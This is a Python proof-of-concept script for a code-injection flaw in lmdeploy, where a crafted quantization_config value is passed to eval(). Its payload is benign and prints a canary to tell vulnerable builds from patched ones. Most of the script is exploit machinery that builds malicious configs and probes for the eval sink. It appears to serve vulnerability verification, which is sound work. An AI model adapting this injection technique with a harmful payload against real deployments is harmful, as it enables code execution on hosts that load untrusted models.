#!/usr/bin/env python3
# PoC for CVE-2026-33625 - code injection in lmdeploy/pytorch/config.py
#
# Sink (vulnerable <=0.12.2):  quant_dtype = eval(f'torch.{quant_dtype}')
# where quant_dtype comes from an attacker-controlled model quantization_config.
# Patched (0.12.3) validates the value (getattr/allowlist) so our expression is
# never eval()'d.
#
# Differential oracle: the canary is printed ONLY by the payload expression that
# the vulnerable eval() actually evaluates. Full evaluated string becomes:
#   torch.float16 if (print(POC_CANARY) or os.environ.setdefault('POC_DONE','1')
#                     or True) else None
# -> side effect: prints the canary; result: a real torch dtype (torch.float16),
#    so control flow continues. On the patched build the string is passed to a
#    validator instead of eval(), the payload never runs, and nothing is printed.
#
# Previous attempt failed ("no canary") because it relied solely on
# ModelConfig.from_hf_config building a full model config first; if that build
# raised before reaching the quant branch, the sink was never hit. This version
# additionally locates the sink-bearing function via inspect and calls it
# directly, and derives the required quant_method from the real source.

import os
import re
import sys
import types
import inspect


def dbg(*a):
    # diagnostics only -- MUST never include the canary
    print('[poc]', *a, file=sys.stderr)


# Expression spliced into f'torch.{quant_dtype}'. Reads the token from the env
# at eval time and prints it; resolves to a valid dtype so nothing downstream
# breaks; sets POC_DONE so we stop after the first successful trigger.
PAYLOAD = ("float16 if (print(__import__('os').environ['POC_CANARY']) "
           "or __import__('os').environ.setdefault('POC_DONE', '1') "
           "or True) else None")


class QConf(dict):
    """quantization_config supporting dict access AND attribute access, covering
    quantization_config['quant_dtype'] / .get('quant_dtype') / .quant_dtype."""

    def __getattr__(self, k):
        try:
            return self[k]
        except KeyError:
            raise AttributeError(k)


# Populated per-attempt with the current quant_method.
QUANT = QConf(quant_dtype=PAYLOAD, bits=8, group_size=128, sym=True,
              desc_act=False, version='gemm', quant_method='smooth_quant')


class Bag:
    """Permissive stand-in for hf_config / model_config for direct sink calls:
    real ints for the numeric fields model builders touch, the malicious
    quantization_config, and None for anything else."""

    _defaults = dict(
        hidden_size=16, num_attention_heads=4, num_key_value_heads=4,
        num_hidden_layers=2, vocab_size=32, intermediate_size=32,
        max_position_embeddings=128, head_dim=4, tp=1, dtype='float16',
        torch_dtype='float16', model_type='llama', quant_dtype=PAYLOAD,
    )

    def __init__(self, **kw):
        self.__dict__.update(self._defaults)
        self.__dict__['quantization_config'] = QUANT
        self.__dict__['architectures'] = ['LlamaForCausalLM']
        self.__dict__.update(kw)

    def __getattr__(self, k):
        return None

    def get(self, k, d=None):
        return self.__dict__.get(k, d)

    def __getitem__(self, k):
        return self.__dict__[k]

    def __contains__(self, k):
        return k in self.__dict__


def build_hfs():
    """Well-formed HF-style configs carrying the malicious quantization_config,
    so lmdeploy's real from_hf_config path can build a model and reach quant."""
    out = []
    try:
        from transformers import LlamaConfig
        hf = LlamaConfig(
            hidden_size=16, num_hidden_layers=2, num_attention_heads=4,
            num_key_value_heads=4, vocab_size=32, intermediate_size=32,
            max_position_embeddings=128, rms_norm_eps=1e-5,
        )
        hf.architectures = ['LlamaForCausalLM']
        hf.quantization_config = QUANT
        out.append(hf)
    except Exception as e:
        dbg('transformers config unavailable:', type(e).__name__, e)
    out.append(types.SimpleNamespace(
        architectures=['LlamaForCausalLM'], model_type='llama',
        hidden_size=16, num_hidden_layers=2, num_attention_heads=4,
        num_key_value_heads=4, vocab_size=32, intermediate_size=32,
        max_position_embeddings=128, rms_norm_eps=1e-5,
        torch_dtype='float16', quantization_config=QUANT,
    ))
    out.append(Bag())
    return out


def done():
    return bool(os.environ.get('POC_DONE'))


def discover_methods(cfg):
    """Read the real source to learn which quant_method values gate the sink."""
    methods = []
    try:
        src = inspect.getsource(cfg)
        for m in re.findall(r"quant_method\s*==\s*['\"]([^'\"]+)['\"]", src):
            methods.append(m)
        for grp in re.findall(r"quant_method\s+in\s+[\(\[\{]([^)\]\}]*)[)\]\}]", src):
            for m in re.findall(r"['\"]([^'\"]+)['\"]", grp):
                methods.append(m)
    except Exception as e:
        dbg('source scan failed:', type(e).__name__, e)
    for m in ['smooth_quant', 'w8a8', 'fp8', 'awq', 'gptq', 'sq',
              'int8', 'fp8_e4m3', None, '']:
        methods.append(m)
    seen, uniq = set(), []
    for m in methods:
        if m not in seen:
            seen.add(m)
            uniq.append(m)
    return uniq


def call_from_hf(cfg, hf):
    fn = cfg.ModelConfig.from_hf_config
    attempts = (
        lambda: fn(hf),
        lambda: fn(hf, None),
        lambda: fn(hf, model_path=None),
        lambda: fn(hf, None, tp=1),
        lambda: fn(hf, model_path=None, tp=1),
        lambda: fn(hf, model_path=None, dtype='float16', tp=1),
    )
    for a in attempts:
        if done():
            return
        try:
            a()
        except Exception as e:
            # A later crash is fine: on the vulnerable build the eval (and thus
            # the canary print) has already happened before any downstream error.
            dbg('from_hf_config:', type(e).__name__, e)


def sink_callables(cfg):
    """Locate functions/methods whose real source contains the eval sink."""
    found = []

    def looks_vulnerable(src):
        return 'quant_dtype' in src and 'eval(' in src

    for name, obj in list(vars(cfg).items()):
        try:
            if callable(obj) and hasattr(obj, '__code__'):
                if looks_vulnerable(inspect.getsource(obj)):
                    found.append(obj)
        except Exception:
            pass
        if inspect.isclass(obj):
            for mn, mo in list(vars(obj).items()):
                target = mo.__func__ if isinstance(mo, (staticmethod, classmethod)) else mo
                try:
                    if callable(target) and hasattr(target, '__code__'):
                        if looks_vulnerable(inspect.getsource(target)):
                            found.append(getattr(obj, mn))
                except Exception:
                    pass
    return found


def call_sink_directly(cfg):
    for fn in sink_callables(cfg):
        if done():
            return
        for k in (1, 2, 3):
            if done():
                return
            try:
                fn(*[Bag() for _ in range(k)])
            except Exception as e:
                dbg('direct', getattr(fn, '__name__', fn), k, type(e).__name__, e)


def main():
    try:
        import torch  # noqa: F401  (needed by the eval's torch.* result)
        import lmdeploy.pytorch.config as cfg
    except Exception as e:
        dbg('import failed:', type(e).__name__, e)
        return

    methods = discover_methods(cfg)
    dbg('quant methods:', methods)

    # Path 1: the real from_hf_config entry point.
    for m in methods:
        if done():
            break
        QUANT['quant_method'] = m
        for hf in build_hfs():
            if done():
                break
            call_from_hf(cfg, hf)

    # Path 2: call the sink-bearing function directly, in case from_hf_config
    # crashes before reaching the quant branch.
    for m in methods:
        if done():
            break
        QUANT['quant_method'] = m
        call_sink_directly(cfg)


if __name__ == '__main__':
    main()